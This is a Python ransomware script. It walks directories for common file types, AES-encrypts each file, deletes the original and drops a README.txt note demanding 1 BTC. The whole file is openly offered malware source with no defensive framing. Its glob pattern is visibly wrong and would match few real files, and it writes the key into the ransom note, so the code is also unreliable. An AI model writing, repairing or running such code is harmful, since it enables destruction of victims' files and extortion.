import os
import base64
import glob
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# --- Configuration ---
# The folder to target. '.' means the current directory.
TARGET_DIR = "."
# File extensions to encrypt
TARGET_EXTENSIONS = [".jpg", ".png", ".pdf", ".docx", ".xlsx", ".txt", ".exe"]
# The extension for encrypted files
ENCRYPTED_EXT = ".locked"
# Ransom note message
RANSOM_NOTE_MSG = "Your files have been encrypted. Send 1 BTC to <address> to get the key."
RANSOM_NOTE_FILE = "README.txt"

# AES Block Size
BLOCK_SIZE = 16

def generate_key():
    """Generates a random 256-bit key for AES."""
    return get_random_bytes(32)

def encrypt_file(file_path, key):
    """
    Encrypts a file using AES in CBC mode.
    Prepends the IV to the encrypted file for later decryption.
    """
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        # Generate a random IV for this file
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        
        # Pad plaintext to be a multiple of block size
        pad_length = BLOCK_SIZE - (len(plaintext) % BLOCK_SIZE)
        padded_plaintext = plaintext + bytes([pad_length] * pad_length)
        
        encrypted_data = cipher.encrypt(padded_plaintext)
        
        # Write the IV + encrypted data to a new file
        encrypted_file_path = file_path + ENCRYPTED_EXT
        with open(encrypted_file_path, 'wb') as f:
            f.write(iv + encrypted_data)
        
        # Delete the original file
        os.remove(file_path)
        print(f"Encrypted: {file_path}")
        
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def create_ransom_note(key):
    """Creates a ransom note file with the encryption key encoded in Base64."""
    # Encode the key as Base64 so it's stored in the note
    key_b64 = base64.b64encode(key).decode('utf-8')
    note_content = f"{RANSOM_NOTE_MSG}\n\nYour Encryption Key:\n{key_b64}"
    
    with open(RANSOM_NOTE_FILE, 'w') as f:
        f.write(note_content)
    print(f"Ransom note created: {RANSOM_NOTE_FILE}")

def main():
    print("Starting encryption...")
    key = generate_key()
    
    # Find all target files
    files_to_encrypt = []
    for ext in TARGET_EXTENSIONS:
        files_to_encrypt.extend(glob.glob(f"**/{ext}", recursive=True))
    
    if not files_to_encrypt:
        print("No target files found.")
        return

    # Encrypt each file
    for file_path in files_to_encrypt:
        encrypt_file(file_path, key)
    
    # Create the ransom note
    create_ransom_note(key)
    print("Encryption complete.")

if __name__ == "__main__":
    main()